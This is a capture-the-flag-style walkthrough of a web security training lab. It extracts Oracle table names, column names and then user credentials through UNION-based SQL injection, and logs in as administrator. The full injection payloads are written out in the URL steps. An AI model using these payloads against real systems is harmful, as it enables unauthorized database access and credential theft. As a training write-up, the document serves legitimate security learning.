**SQL Injection — Lab #10 SQL injection attack, listing the database contents on Oracle**

<img width="1100" height="531" alt="image" src="https://github.com/user-attachments/assets/84d2243d-446d-4715-b2f7-3f93fe946da3" />

As per description of the Lab, product category is vulnerable to SQLi.

End goal of the lab is to login as **administrator**

Step 1:- Determine which table contains username and password.

Step 2:- Determine column names of the Table

Step 3 :- Output the content of the Table.

Step 4:- Login as Administrator

Lets start the Lab

<img width="1100" height="619" alt="image" src="https://github.com/user-attachments/assets/97c7108b-8e5a-4548-a0e1-dae85099dcb4" />

As per description of the Lab, product category is vulnerable to SQLi.

Lets validate

<img width="1100" height="298" alt="image" src="https://github.com/user-attachments/assets/c1a7f4cd-6bac-4880-b17a-00b95cd24c5b" />

Now, for performing SQLi UNION attack, we need to know two things.

1. We need to know the number of column in a Table.
   
2. We need to know the data type of the columns.

**STEP 1:- Determine the number of Columns**

Now we can take a guess that there are two columns. One for Title and one for articles.

However lets validate

***web-security-academy.net/filter?category=Accessories’ ORDER BY 1 --***

<img width="1100" height="770" alt="image" src="https://github.com/user-attachments/assets/7d0dc6fd-dd05-48ef-a05e-d3cc21c12dd1" />

***web-security-academy.net/filter?category=Accessories’ ORDER BY 2 --***

<img width="1100" height="696" alt="image" src="https://github.com/user-attachments/assets/f1a571ed-6c83-475b-8df1-769fb7e31ab6" />

***web-security-academy.net/filter?category=Accessories’ ORDER BY 3 --***

<img width="1100" height="293" alt="image" src="https://github.com/user-attachments/assets/be1e3498-c899-4e99-bc94-f1749ab20d2c" />

We got an error. So it confirms that Table has 2 columns

**STEP 2:- Need to determin the Datatype of the columns**

As we are using Oracle Database we need to use FROM DUAL

***web-security-academy.net/filter?category=Accessories’ UNION SELECT ‘a’ , ‘a’ FROM DUAL --***

<img width="1100" height="693" alt="image" src="https://github.com/user-attachments/assets/54f1b682-f0ba-424f-b9a4-9052d63fe1e0" />

It confirms that both columns are strings data type.

**STEP 3:- To Output the list of Tables in the Database**

Lets check the Cheat Sheel for Query

<img width="1018" height="352" alt="image" src="https://github.com/user-attachments/assets/fc09fa4b-9933-4e71-a72f-970881fceed6" />

***SELECT * FROM all_tables*** >> This query will display all the tables in the Database.

We need to know two columns on the Oracle. Lets google

https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html

<img width="1100" height="493" alt="image" src="https://github.com/user-attachments/assets/917b9845-8e03-4f58-bb84-b993ecce19d8" />

Lets make the payload

***web-security-academy.net/filter?category=Accessories’ UNION SELECT table_name , NULL FROM all_tables --***

<img width="1100" height="710" alt="image" src="https://github.com/user-attachments/assets/7923c66c-4195-424c-992b-db42efda4efa" />

We got the list of all Tables.

There is a table called **USERS_MBQNKX**. This table could contain username and passwords.

**STEP 4:- Determine the column names that contains username and password in the table USERS_MBQNKX**

Lets check the Cheat Sheet again

<img width="1005" height="352" alt="image" src="https://github.com/user-attachments/assets/3f2d0190-cdaf-4e8b-a7ec-46c2e2d31cc1" />

We have the table name. We need to figure the column name. Lets google again

<img width="1100" height="318" alt="image" src="https://github.com/user-attachments/assets/3da1b242-bda8-4806-9166-560879e3a58a" />

Lets make the payload

***web-security-academy.net/filter?category=Accessories’ UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = ‘USERS_MBQNKX’ --***

<img width="1100" height="771" alt="image" src="https://github.com/user-attachments/assets/da0e86f1-80aa-4853-8aac-e6254cf8fed6" />

We got column names for username: **USERNAME_QNYCMV** and for password: **PASSWORD_JUFIST**

**STEP 5 :- Determine the username and passwords**

As we know the Table and its column that contains username and password, we need to find password for administrator.

***web-security-academy.net/filter?category=Accessories’ UNION SELECT USERNAME_QNYCMV, PASSWORD_JUFIST FROM USERS_MBQNKX --***

<img width="1100" height="812" alt="image" src="https://github.com/user-attachments/assets/b6494888-7e77-4180-8877-c8c8673319d5" />

We got the password for administrator.

<img width="1100" height="398" alt="image" src="https://github.com/user-attachments/assets/d5187390-62c1-473a-92ed-99876bac80aa" />

We are logged in and Lab is solved !!!


